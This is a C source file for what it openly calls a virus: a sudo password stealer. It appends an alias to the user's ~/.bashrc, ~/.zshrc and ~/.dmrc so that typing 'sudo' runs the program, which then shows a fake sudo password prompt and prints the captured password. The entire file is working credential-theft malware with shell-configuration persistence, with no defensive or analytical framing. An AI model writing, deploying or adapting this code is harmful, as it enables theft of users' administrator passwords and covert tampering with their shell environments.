#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>
#include <fcntl.h>
#include "pseudo.h"

#define PASSWD_SIZE 1024
#define UNAME_SIZE 1024

static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};

int main(int argc, char ** argv){

  //set mode
  int mode = P_IMPLANT;
  for (int i = 0; i<argc; i++){
    if (strcmp(argv[i],"SUDO") == 0){
      mode = P_SUDO;
      break;
    }
  }

  //implant the alias to the virus as sudo...
  if(mode == P_IMPLANT){
    alias_virus();
  }
  
  //fake being sudo. We know we are sudo because we recieved the sudo alias prompt
  if(mode == P_SUDO){
    char passwd[PASSWD_SIZE];
    char username[UNAME_SIZE];

    steal_password(passwd, username);

    printf("%s's password is %s\n", username, passwd);
  }
}


int get_username(char * uname){
  uid_t uid = getuid();
  struct passwd *pw = getpwuid(uid);
  strcpy(uname, pw -> pw_name);
}

int steal_password(char * passwd, char * username){
  get_username(username);

  char prompt[UNAME_SIZE + 32];
  sprintf(prompt,"[sudo] password for %s: ", username);

  char * returned_pass = getpass(prompt);
  
  strcpy(passwd, returned_pass);

  free(returned_pass);

}

int alias_virus(){
  //get the home dir
  char * home_dir_path= getenv("HOME");
  
  //get the path to the virus
  char path_to_this_exe[1024] = "";
  readlink("/proc/self/exe", path_to_this_exe, sizeof(path_to_this_exe));
  
  //prepare the alias
  char alias[2048] = "alias sudo=\"";
  sprintf(alias, "alias sudo=\"%s SUDO '$@'\"", path_to_this_exe);
  
  for (int i = 0; i<sizeof(CONFIGS)/sizeof(char *); i++){
    append_virus(home_dir_path, CONFIGS[i], alias);
  }

}

int append_virus(char * home_dir, char * config_file, char * alias){
  char buffer[1024] = "";

  strcpy(buffer, home_dir);
  strcat(buffer, config_file);

  printf("%s\n", buffer);

  int fd = open(buffer, O_WRONLY|O_CREAT, 0644);
  if(fd < 0){
    perror("no file exists");
    return -1;
  }


  lseek(fd, 0, SEEK_END);
  write(fd, alias, strlen(alias));
  write(fd,"\n",strlen("\n"));


  close(fd);

}
